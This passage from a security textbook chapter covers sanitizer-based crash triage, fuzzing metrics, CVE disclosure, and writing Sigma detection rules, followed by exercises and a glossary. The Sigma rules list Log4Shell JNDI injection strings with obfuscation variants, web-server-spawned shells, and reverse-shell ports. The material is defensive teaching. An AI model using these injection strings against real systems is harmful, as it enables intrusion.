**AddressSanitizer (ASAN) report analysis.** ASAN reports classify the memory error: `heap-buffer-overflow` (read/write past allocated heap object), `stack-buffer-overflow` (past stack frame), `heap-use-after-free` (access after deallocation), `double-free`, `alloc-dealloc-mismatch` (new/free or malloc/delete mix), `stack-use-after-return`, and `use-of-uninitialized-value` (MSan). The report includes: the access address, whether the access was a read or write, the allocation site (where the buffer was created), the deallocation site (for UAF), and the full stack trace at the point of violation.

```
=================================================================
==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000058
  at pc 0x555555588a32 bp 0x7fffffffdc40 sp 0x7fffffffdc38
WRITE of size 4 at 0x602000000058 thread T0
    #0 0x555555588a31 in parse_chunk src/parser.c:247
    #1 0x555555587102 in process_input src/handler.c:89
    #2 0x555555586004 in main src/main.c:42

0x602000000058 is located 8 bytes after 16-byte region
  [0x602000000040,0x602000000050)
allocated by thread T0 here:
    #0 0x7ffff7a3c0a7 in malloc (/lib/x86_64-linux-gnu/libasan.so.6)
    #1 0x555555588932 in parse_chunk src/parser.c:238
```

The critical triage information: the overflow is a 4-byte write, 8 bytes past a 16-byte allocation. The overflow distance (8 bytes) and write size (4 bytes) constrain what an attacker can overwrite — adjacent heap metadata or the next heap object's header/data. A write overflow past a heap allocation is generally exploitable (heap metadata corruption, object field overwrite); a read overflow leaks data (information disclosure, ASLR bypass) but does not directly control execution.

**MemorySanitizer (MSAN) reports.** MSAN detects use of uninitialized memory — a vulnerability class that ASAN does not cover. Uninitialized reads can leak kernel memory (in kernel context) or stack/heap contents (in userspace), enabling ASLR bypass or credential theft. MSAN tracks the origin of uninitialized data through `origin_tracking=2`, reporting the exact allocation where the uninitialized memory was created:

```
==67890==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x555555589a01 in send_response src/response.c:156
  Uninitialized value was stored to memory at
    #0 0x555555588102 in fill_buffer src/response.c:134
  Uninitialized value was created by a heap allocation
    #0 0x7ffff7a3c0a7 in malloc (/lib/x86_64-linux-gnu/libmsan.so.0)
    #1 0x555555587f02 in allocate_response src/response.c:120
```

**GDB `exploitable` plugin.** The `exploitable` GDB plugin (from CERT/CC) classifies crashes by exploitability: EXPLOITABLE (instruction-pointer control, write-what-where), PROBABLY_EXPLOITABLE (heap corruption, stack corruption), PROBABLY_NOT_EXPLOITABLE (null dereference at fixed offset, division by zero), and UNKNOWN. The classification is heuristic but provides automated first-pass triage for large crash sets:

```bash
# Automated crash classification
for crash in findings/crashes/id:*; do
    gdb -batch -ex "run < $crash" \
        -ex "exploitable -v" \
        ./target_debug 2>&1 | \
        grep -E "Exploitability|Description" >> triage_report.txt
done
```

### 8.2 Vulnerability discovery metrics

Quantitative metrics guide campaign management, resource allocation, and cross-campaign comparison.

**Coverage saturation curve.** Plotting edge coverage (y-axis) against fuzzing time (x-axis) reveals the campaign's discovery dynamics. A healthy campaign shows rapid initial coverage growth (the seed corpus exercises well-trodden paths) followed by a logarithmic taper (diminishing returns as the fuzzer explores deeper code). A flat line from the start indicates a fundamentally broken harness (the target rejects all inputs). A sudden plateau followed by a step increase indicates the fuzzer solved a barrier (CmpLog cracked a magic-byte comparison). Campaign managers monitor this curve and intervene when coverage has not increased for 24+ hours.

**Unique-crash accumulation rate.** Plotting unique crashes (by stack-trace hash) over time. A steadily increasing curve means the fuzzer is still finding diverse bugs. A flat curve after initial crashes means the fuzzer is hitting the same bug repeatedly (the bug is in a hot code path) — the researcher should fix the first bug and restart fuzzing on the patched version, or mark the crash address as excluded.

**Core-hour efficiency.** Total unique bugs divided by total core-hours. Across public OSS-Fuzz data, well-fuzzed libraries average 0.001–0.01 unique bugs per core-hour after initial bugs are exhausted. Less-tested targets yield 0.1–1.0 bugs per core-hour in early campaigns. This metric justifies resource allocation: a target yielding 0 bugs after 10,000 core-hours should either be declared adequately fuzzed or have its harness redesigned.

### 8.3 CVE coordination and responsible disclosure mechanics

**MITRE CNA program.** CVE Numbering Authorities (CNAs) are organizations authorized to assign CVE IDs within their scope. As of 2025, there are 300+ CNAs spanning software vendors (Microsoft, Apple, Google), open-source ecosystems (GitHub, Red Hat), coordination centers (CERT/CC, JPCERT/CC), and bug-bounty platforms (HackerOne, Bugcrowd). The researcher identifies the appropriate CNA: if the vulnerable software's vendor is a CNA, report directly to them; for open-source projects on GitHub, use GitHub's security advisory feature (which auto-assigns CVEs as GitHub is a CNA); for vendors without CNA status, request a CVE from MITRE directly via `cveform.mitre.org`.

**Multi-vendor coordinated disclosure.** When a vulnerability affects a shared library or protocol (e.g., a TLS library bug affecting dozens of products), disclosure must be coordinated across all affected vendors simultaneously. CERT/CC (Carnegie Mellon) acts as a neutral coordinator: the researcher reports to CERT/CC, which notifies all affected vendors under embargo, coordinates a synchronized patch-release date, and publishes a vulnerability note (VU#) on the disclosure date. The embargo period is typically 45 days from notification.

**Disclosure document structure.** A complete disclosure report includes: title (vulnerability class + component), CVE ID, affected versions (inclusive ranges), CVSS 4.0 vector and score, CWE classification, technical description (root cause, trigger conditions), proof-of-concept (minimized reproducer, sanitizer output), exploitation impact (what an attacker achieves), mitigation (patch reference, configuration workaround), timeline (discovery date, vendor notification date, patch date, disclosure date), and credits. All dates in ISO 8601 UTC format.

---

## 9. Detection engineering for exploitation

### 9.1 Sigma rules for active exploitation detection

Detection engineering bridges vulnerability discovery and defensive operations. When a vulnerability is discovered or a PoC is published, defenders need detection rules to identify exploitation attempts in their environments before patches are deployed.

**Sigma** is a generic signature format for SIEM systems. Sigma rules are YAML documents that describe log-event patterns; converters transform them into queries for specific backends (Splunk SPL, Elasticsearch KQL, Microsoft Sentinel, QRadar AQL).

**Detecting active exploitation of known CVEs.** When a CVE has a known exploitation pattern (specific HTTP path, syscall sequence, network signature), a Sigma rule codifies that pattern:

```yaml
title: Log4Shell JNDI Exploitation Attempt (CVE-2021-44228)
id: 5b23a94b-e4c0-4f38-af01-f23c2d476e09
status: stable
description: >
  Detects JNDI lookup strings in web server access logs indicating
  Log4Shell exploitation attempts. Covers ldap, rmi, dns, and
  iiop protocols used in observed attacks.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://logging.apache.org/log4j/2.x/security.html
date: 2021-12-10
modified: 2024-01-15
author: Security Research Team
tags:
  - attack.initial_access
  - attack.t1190
  - cve.2021.44228
logsource:
  category: webserver
  product: apache
detection:
  selection:
    cs-uri|contains:
      - '${jndi:ldap://'
      - '${jndi:rmi://'
      - '${jndi:dns://'
      - '${jndi:iiop://'
    # Obfuscation bypass patterns
    obfuscation:
      cs-uri|contains:
        - '${${lower:j}ndi:'
        - '${${upper:j}ndi:'
        - '${${::-j}ndi:'
        - '${j${::-n}di:'
  condition: selection or obfuscation
  fields:
    - c-ip
    - cs-uri
    - cs-User-Agent
    - sc-status
level: critical
falsepositives:
  - Legitimate JNDI lookups in development environments (rare in production)
```

### 9.2 Detecting attacker fuzzing of your services

Attackers fuzz production services to discover zero-day vulnerabilities before defenders. Detecting this reconnaissance phase provides early warning.

**Indicators of remote fuzzing.** Attacker fuzzing exhibits distinctive traffic patterns: high request rate from a single source with diverse payloads, elevated error rates (4xx and 5xx responses), malformed inputs that trigger parsing failures (the fuzzer generates structurally invalid requests), sequential probing of endpoints, and anomalous payload distributions (random bytes, boundary values, format-string specifiers, long strings).

```yaml
title: Suspected API Fuzzing Activity
id: 8f1a3b2e-9c47-4d5a-b108-e72f6a9d3c01
status: experimental
description: >
  Detects suspected fuzzing activity based on high error rates
  from a single source IP within a short time window.
date: 2025-01-20
author: Security Research Team
tags:
  - attack.reconnaissance
  - attack.t1595.002
logsource:
  category: webserver
detection:
  selection:
    sc-status|startswith:
      - '4'
      - '5'
  filter_known_scanners:
    c-ip|cidr:
      - '192.168.0.0/16'   # adjust to internal ranges
  timeframe: 5m
  condition: selection and not filter_known_scanners | count(cs-uri) by c-ip > 100
level: medium
falsepositives:
  - Automated testing from CI/CD pipelines
  - Legitimate load testing
  - Broken client implementations
```

### 9.3 Patch-gap exploitation detection

The period between a security patch release and its deployment across an organization's fleet is the "patch gap." Attackers reverse-engineer patches (via the 1-day analysis workflow in §4.9) and develop exploits targeting unpatched systems. Detection rules for patch-gap exploitation monitor for exploitation signatures derived from the patch diff.

The detection workflow: (1) analyze the patch to identify the vulnerability trigger (the condition the patch adds), (2) determine the observable side effects of exploitation (specific error messages, crash signatures, anomalous system calls), (3) write Sigma rules detecting those side effects, (4) deploy rules before the organization's patch cycle completes.

```yaml
title: Suspected Exploitation of Unpatched CVE-2024-XXXXX
id: a7c2f1e8-3d94-4b67-9e52-1f8a0c5b7d23
status: experimental
description: >
  Detects exploitation attempts targeting the buffer overflow in
  service_daemon's request parser. The patch adds a length check
  before memcpy; exploitation triggers a crash or anomalous
  memory-write pattern observable in service logs.
date: 2025-03-15
author: Security Research Team
tags:
  - attack.exploitation
  - attack.t1203
logsource:
  product: linux
  service: syslog
detection:
  segfault_in_target:
    - 'service_daemon' 
    - 'segfault at'
    - 'in parse_request'
  asan_indicator:
    - 'heap-buffer-overflow'
    - 'parse_request'
  condition: segfault_in_target or asan_indicator
level: high
```

### 9.4 Honeypots and canary tokens

Honeypots deployed alongside production services detect exploitation attempts by presenting intentionally vulnerable targets that no legitimate user should interact with.

**Vulnerability-specific honeypots.** When a high-profile CVE is disclosed (e.g., CVE-2021-44228 Log4Shell), deploying a honeypot that mimics the vulnerable service captures exploitation attempts, attacker tooling, and post-exploitation payloads. Frameworks: OpenCanary (lightweight honeypot daemon), Cowrie (SSH/Telnet honeypot), and Artillery (combined honeypot and monitoring). For web-application vulnerabilities, a Docker container running the vulnerable version behind monitoring captures full HTTP request/response pairs from attackers.

**Canary tokens.** Canary tokens are tripwires embedded in files, URLs, DNS records, or database rows that trigger an alert when accessed. For vulnerability research, canary tokens detect: exfiltration of sensitive files (embed a canary URL in internal documents — if the URL is requested, the document was accessed by an unauthorized party), database breach (insert canary rows in user tables — if a query returns the canary, the database was dumped), and DNS exfiltration (register canary DNS names — if they resolve, an attacker is exfiltrating data via DNS). Thinkst Canary and canarytokens.org provide hosted canary-token infrastructure.

### 9.5 PoC-to-Sigma rule methodology

When a vulnerability researcher produces a proof-of-concept exploit, converting that PoC into a detection rule is a systematic process that turns offensive knowledge into defensive capability.

**Step 1: Execute the PoC in a monitored environment.** Run the PoC against a vulnerable target while capturing: network traffic (pcap), system logs (syslog, Windows Event Log), process creation events (Sysmon, auditd), and file-system changes. Record all observable side effects.

**Step 2: Identify invariant indicators.** From the captured data, identify patterns that are always present during exploitation and unlikely during normal operation. Indicators include: specific byte sequences in network payloads (magic bytes, shellcode NOPs), unusual process ancestry (web server spawning cmd.exe), specific file paths created/modified (webshells, temp files), anomalous registry modifications (persistence mechanisms), and distinctive DNS queries (C2 domains, DNS tunneling patterns).

**Step 3: Write the Sigma rule.** Encode the invariant indicators as a Sigma rule. Test against both the PoC traffic (true positive) and normal production traffic (false positive check). Iterate on specificity: too broad catches normal operations; too narrow misses obfuscated variants.

```yaml
title: PoC Detection Template — Post-Exploitation Indicator
id: d4e5f6a7-8b9c-0d1e-2f3a-4b5c6d7e8f90
status: experimental
description: >
  Template for detecting exploitation based on PoC execution
  artifacts. Derived from controlled PoC execution in lab
  environment on [DATE].
date: 2025-05-13
author: Security Research Team
tags:
  - attack.execution
  - attack.t1059
logsource:
  product: windows
  service: sysmon
detection:
  process_creation:
    EventID: 1
    ParentImage|endswith:
      - '\httpd.exe'
      - '\nginx.exe'
      - '\w3wp.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\certutil.exe'
  network_connection:
    EventID: 3
    DestinationPort:
      - 4444   # common reverse-shell port
      - 8443
      - 1337
    Initiated: 'true'
  condition: process_creation or network_connection
level: high
falsepositives:
  - Legitimate admin scripts launched from web server context
  - Health-check processes with network callbacks
```

**Step 4: Validate and publish.** Run the rule against a SIEM replay of the PoC execution to confirm detection. Run against one week of production logs to measure false positives. Adjust thresholds and exclusions. Publish to the organization's detection repository with version control and the linked CVE reference.

---

## 10. Cross-references

**To Domain 3 (userspace exploitation):** The vulnerability patterns found here (heap overflow, UAF, integer overflow) are the same vulnerability classes exploited in Chapters 3A and 3B. The exploitability of each bug depends on the mitigation landscape (ASLR, heap hardening, CFI) described in Domain 6.

**To Domain 5 (kernel exploitation):** Syzkaller (§2.1) discovers kernel vulnerabilities that are exploited using the techniques from Domain 5 (SLUB spray, cross-cache attacks, commit_creds). kAFL (§2.5) enables kernel vulnerability discovery without source access.

**To Domain 12 (RE):** Binary auditing (§4) uses the same decompilation and analysis tools described in Domain 12 Chapter 12A. The data-flow analysis, CFG construction, and type recovery from Chapter 12A §1 are the prerequisites for effective binary vulnerability discovery.

**To Chapter 26B:** The vulnerabilities discovered here are developed into working exploits in Chapter 26B. The exploit developer needs: the vulnerability's root cause (from §3–4), the target's mitigation landscape (from Domain 6), and the platform-specific exploitation primitives (from Chapter 26B).

**To §5 (program design):** The campaign planning methodology (§5.1) synthesizes all discovery techniques from §1–4 into a structured program. The scoring (§5.2) and disclosure (§5.3) workflows close the loop from discovery to remediation.

**To §6–§7 (advanced fuzzing and static analysis):** Structure-aware fuzzing (§6.1), browser fuzzing (§6.4), and advanced CodeQL queries (§7.1) extend the foundational techniques from §1 and §3 to specialized targets. The static-analysis comparison matrix (§7.5) guides tool selection for campaign planning (§5.1).

**To §8 (forensics and metrics):** Crash triage (§8.1) is the essential next step after any fuzzing campaign (§1, §6) produces crashes. The CVE coordination workflow (§8.3) connects vulnerability discovery to the responsible-disclosure process (§5.3).

**To §9 (detection engineering):** Detection rules (§9.1–§9.5) translate vulnerability and exploit knowledge from §1–§8 into defensive signatures. The PoC-to-Sigma methodology (§9.5) bridges offensive research and SOC operations, connecting this chapter to Domain 22 (SOC architecture) and Domain 20 (threat intelligence).

---

## Exercises

1. **AFL++ fuzzing campaign against a real parser.** Select an open-source image or document parser (e.g., libtiff, libpng, or poppler). Compile the target with `afl-clang-fast` and ASan, build a separate CmpLog binary, construct a seed corpus from the project's test suite, minimize with `afl-cmin` and `afl-tmin`, and create a format-specific dictionary. Launch a multi-instance campaign (one primary with CmpLog + RARE schedule, one secondary with a custom mutator or grammar). Run for at least 4 hours, analyze coverage with `afl-cov` and gcov, and triage all unique crashes under ASan. Document the campaign setup, coverage plateau analysis, and any confirmed bugs with root-cause analysis.

2. **Syzkaller kernel fuzzing of a specific subsystem.** Write syzlang descriptions for a Linux kernel subsystem not already covered by Syzkaller's built-in descriptions (e.g., a character device driver or a less-tested ioctl interface). Configure `syz-manager` with `enable_syscalls` limited to your new descriptions, KCOV coverage enabled, and 4 QEMU VMs. Run the campaign for 8+ hours, analyze the coverage tab in syz-manager's web UI to identify uncovered functions, and if crashes are found, use `syz-repro` to generate a minimal C reproducer. Document the syzlang grammar, the campaign configuration, and coverage statistics.

3. **CodeQL variant analysis for a historical CVE.** Select a historical CVE with a known code pattern (e.g., CVE-2021-3156 sudoedit heap overflow or CVE-2021-44228 Log4Shell). Create a CodeQL database for the affected project's pre-patch version. Write a CodeQL query that captures the vulnerability's root-cause pattern (buffer-size mismatch, unsanitized JNDI lookup, etc.). Run the query against the pre-patch codebase to confirm it finds the known vulnerability. Then run the same query against the post-patch codebase to confirm the fix eliminates the finding. Finally, run the query against at least two other open-source projects to search for variant instances of the same pattern.

4. **Binary patch-diff analysis with BinDiff/Diaphora.** Obtain pre-patch and post-patch versions of a Windows system DLL affected by a recent Patch Tuesday security update (download from Microsoft Update Catalog). Export BinExport files from Ghidra for both versions. Run BinDiff comparison, sort by similarity score, and identify the 3-5 most-changed functions. For each changed function, analyze the diff to identify: what validation was added, what code path was vulnerable, and what the exploitability assessment is. Write a 1-day analysis report with CVSS 4.0 vector, CWE classification, and reachability assessment.

5. **Semgrep taint-mode rule development.** For a Python Flask web application (provided or from a deliberately-vulnerable app like DVWA/Juice Shop), write Semgrep taint-mode rules that detect: (a) SQL injection via `cursor.execute()` with string-formatted queries, (b) command injection via `os.system()` or `subprocess.call(shell=True)` with user input, and (c) path traversal via `open()` with unsanitized `request.args` input. Define explicit sources (`flask.request.*`), sinks, propagators (f-string formatting, `.format()`), and sanitizers. Run against the target application, verify true positives, document any false positives, and add autofix patterns where applicable.

---

## Readings and References

- AFL++ documentation and repository. <https://github.com/AFLplusplus/AFLplusplus> (retrieved: 2026-05-29)
- Syzkaller — kernel fuzzer documentation. <https://github.com/google/syzkaller/blob/master/docs/> (retrieved: 2026-05-29)
- Google OSS-Fuzz — continuous fuzzing for open source. <https://google.github.io/oss-fuzz/> (retrieved: 2026-05-29)
- CodeQL documentation — QL language reference and standard libraries. <https://codeql.github.com/docs/> (retrieved: 2026-05-29)
- Semgrep documentation — pattern syntax and taint mode. <https://semgrep.dev/docs/> (retrieved: 2026-05-29)
- FIRST CVSS v4.0 specification. <https://www.first.org/cvss/v4.0/specification-document> (retrieved: 2026-05-29)
- EPSS (Exploit Prediction Scoring System). <https://www.first.org/epss/> (retrieved: 2026-05-29)
- Ghidra — NSA reverse engineering framework. <https://ghidra-sre.org/> (retrieved: 2026-05-29)
- BinDiff — binary diffing tool by Zynamics/Google. <https://zynamics.com/software.html> (retrieved: 2026-05-29)
- CVE-2022-0185 — legacy_parse_param heap overflow. <https://nvd.nist.gov/vuln/detail/CVE-2022-0185> (retrieved: 2026-05-29)
- CVE-2021-22555 — Netfilter setsockopt OOB write. <https://nvd.nist.gov/vuln/detail/CVE-2021-22555> (retrieved: 2026-05-29)
- CVE-2021-3156 — sudo Baron Samedit. <https://nvd.nist.gov/vuln/detail/CVE-2021-3156> (retrieved: 2026-05-29)

---

## Cross-Reference Matrix

| Domain / Chapter | Relationship to This Chapter | Key Linked Sections |
|---|---|---|
| Domain 3 — Userspace Exploitation | Vulnerability patterns (heap overflow, UAF, integer overflow) are the same classes exploited in Chapters 3A/3B | §3.1–§3.2 |
| Domain 5 — Kernel Exploitation | Syzkaller discovers kernel vulnerabilities exploited via SLUB spray, cross-cache attacks, commit_creds | §2.1–§2.6 |
| Domain 6 — Mitigations | Exploitability depends on ASLR, heap hardening, CFI landscape described in Domain 6 | §3.1, §5.2 |
| Domain 12 — Reverse Engineering | Binary auditing uses decompilation, CFG construction, and type recovery from Chapter 12A | §4.1–§4.9 |
| Domain 26B — Exploit Development | Vulnerabilities discovered here are developed into working exploits in Chapter 26B | §3–§4, §5.2 |
| Domain 27C — Detection Engineering | PoC-to-Sigma methodology bridges offensive research and SOC operations | §9.1–§9.5 |

---

## Glossary

- **AFL++ (American Fuzzy Lop Plus Plus):** Community fork of AFL; the most widely-used coverage-guided fuzzer, supporting compile-time instrumentation, QEMU mode, persistent mode, CmpLog, and custom mutators.
- **ASan (AddressSanitizer):** Compiler instrumentation (`-fsanitize=address`) detecting memory-safety violations (heap/stack overflow, UAF, double-free) at runtime with ~2x overhead.
- **BinDiff:** Binary diffing tool comparing two binary versions to identify added, removed, or modified functions; primary tool for 1-day patch analysis.
- **CmpLog (Comparison Logging):** AFL++ enhancement instrumenting comparison instructions to capture compared values, enabling the fuzzer to overcome magic-byte barriers.
- **Coverage-guided fuzzing:** Fuzzing technique using code-coverage feedback (edge bitmap) to guide mutation toward unexplored code paths, systematically exploring the program's input space.
- **CVSS 4.0:** Common Vulnerability Scoring System version 4.0 with Base, Threat, Environmental, and Supplemental metric groups; replaces CVSS 3.1's Scope with Vulnerable/Subsequent System impact.
- **EPSS (Exploit Prediction Scoring System):** Model estimating the probability (0-1) that a vulnerability will be exploited in the wild within 30 days, complementing CVSS for prioritization.
- **Fork server:** AFL performance optimization that starts the target once, then `fork()`s the frozen process for each test case, avoiding repeated `execve()` overhead.
- **KCOV:** Linux kernel coverage-tracing mechanism providing per-syscall coverage feedback to kernel fuzzers like Syzkaller.
- **libFuzzer:** LLVM's in-process coverage-guided fuzzer using the `LLVMFuzzerTestOneInput` harness API, with built-in corpus management and sanitizer integration.
- **MOpt (Mutation Optimization):** AFL++ feature using particle-swarm optimization to dynamically adjust mutation-strategy probabilities based on recent effectiveness.
- **Persistent mode:** AFL++ optimization calling the target's input-processing function in a loop within a single process, achieving 10-100x throughput over fork-server mode.
- **Semgrep:** Lightweight pattern-based static analysis tool supporting taint-mode tracking, metavariables, and autofix patterns across multiple languages.
- **syzlang:** Syzkaller's typed syscall description language encoding argument types, resource semantics, and inter-syscall dependencies for valid test-case generation.
- **Variant analysis:** Practice of writing a detection query (CodeQL, Semgrep) capturing a known vulnerability's pattern, then running it across codebases to find all similar instances.
